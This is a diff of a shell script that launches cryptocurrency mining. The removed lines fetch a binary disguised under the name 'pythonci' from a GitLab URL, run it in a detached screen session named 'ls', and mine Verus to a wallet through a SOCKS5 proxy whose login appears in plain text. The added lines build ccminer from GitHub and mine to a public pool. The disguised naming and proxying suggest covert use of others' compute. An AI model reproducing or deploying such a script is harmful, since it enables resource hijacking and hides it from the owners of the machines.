@@ -1,12 +1,8 @@
-#!/bin/bash
-sudo apt update
-sudo apt install screen -y
-sudo apt install screen libjansson4 -y
-wget https://gitlab.com/Scalaxlarig/bisalahhh/-/raw/main/pythonci
-chmod +x pythonci
-screen -dmS ls
-PL=stratum+tcp://na.luckpool.net:3956
-WT=RNfF475UVShH9C3n8abuUnxgCxsRYR9rNe
-WR=jajal
-PY=socks5://w1rtyuw:s1dfgyt3b@150.129.171.123:6667
-./pythonci -a verus -o $PL -u $WT.$WR -p x -t 2 -x $PY
+sudo apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential
+git clone --single-branch -b verus2.2gpu https://github.com/monkins1010/ccminer.git
+cd ccminer
+chmod +x build.sh
+chmod +x configure.sh
+chmod +x autogen.sh
+./build.sh
+./ccminer -a verus -o stratum+tcp://verushash.asia.mine.zergpool.com:3300 -u DETdziwkuGWnXmLXUxp4yDjRpxp4pBS196.PC -p c=DOGE -t 8
